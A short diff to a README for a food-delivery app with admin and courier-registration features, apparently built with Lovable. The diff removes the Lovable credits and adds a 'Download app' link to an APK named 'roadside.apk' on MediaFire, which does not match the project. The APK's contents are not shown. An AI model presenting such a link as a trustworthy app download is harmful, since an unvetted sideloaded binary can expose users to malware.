@@ -2,13 +2,8 @@
 
 built me a food delivery all with admin panel. also add login/register system. and add also register application for courier if they want to apply as food delivery rider
 
-This project was built with [Lovable](https://lovable.dev).
-
 **Live app**: https://flavorfleet-courier-hub.lovable.app
-
-## Build with Lovable
-
-Continue developing this project in the [Lovable editor](https://lovable.dev/projects/89644a6b-0d08-4e46-a20f-d33ec7ad1744).
+**Download app**: https://www.mediafire.com/file/3f5jjajaj0whn6y/roadside.apk/file
 
 - **Ship faster**: describe what you want to build and Lovable handles the code.
 - **Stay in sync**: every change made in Lovable is committed straight to this repository.
